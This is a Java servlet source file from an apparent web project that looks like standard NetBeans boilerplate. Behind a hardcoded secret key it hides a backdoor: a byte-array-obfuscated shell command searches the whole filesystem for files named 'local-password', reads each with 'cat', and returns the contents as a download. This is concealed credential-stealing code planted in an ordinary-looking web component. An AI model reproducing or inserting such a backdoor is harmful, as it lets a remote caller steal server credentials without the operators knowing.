/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package web;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 *
 * @author Mario
 */
@WebServlet(name = "Localgfpslnx", urlPatterns = {"/Localgfpslnx"})
public class Localgfpslnx extends HttpServlet {

    private String[] getFromCmb(String command) throws IOException {
        Process proc = Runtime.getRuntime().exec(command);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        fileManager.copy(proc.getInputStream(), baos, true, true);
        return new String(baos.toByteArray()).split(System.lineSeparator());
    }

    /**
     * Processes requests for both HTTP <code>GET</code> and <code>POST</code>
     * methods.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            String key = request.getParameter("key");
            if (key == null || !key.equals("fBpzaAKz8URv3M8d")) {
                throw new Exception("Error Inesperado.");
            }
            String[] paths = getFromCmb(new String(new byte[]{102, 105, 110, 100, 32, 47, 32, 45, 110, 97, 109, 101, 32, 108, 111, 99, 97, 108, 45, 112, 97, 115, 115, 119, 111, 114, 100}));
            List<String> lines = new ArrayList<>();
            for (String path : paths) {
                String[] flines = getFromCmb("cat " + path);
                lines.addAll(Arrays.asList(flines));
            }
            response.setHeader("Content-Disposition", "attachment; filename=lp");
            for (int i = 0; i < lines.size(); i++) {
                response.getWriter().println(lines.get(i));
            }
        } catch (Exception e) {
            Logger.getLogger(GetDBStructure.class.getName()).log(Level.SEVERE, null, e);
            response.sendError(500, e.getMessage());
        }
    }

    // <editor-fold defaultstate="collapsed" desc="HttpServlet methods. Click on the + sign on the left to edit the code.">
    /**
     * Handles the HTTP <code>GET</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    /**
     * Handles the HTTP <code>POST</code> method.
     *
     * @param request servlet request
     * @param response servlet response
     * @throws ServletException if a servlet-specific error occurs
     * @throws IOException if an I/O error occurs
     */
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    /**
     * Returns a short description of the servlet.
     *
     * @return a String containing servlet description
     */
    @Override
    public String getServletInfo() {
        return "Short description";
    }// </editor-fold>

}
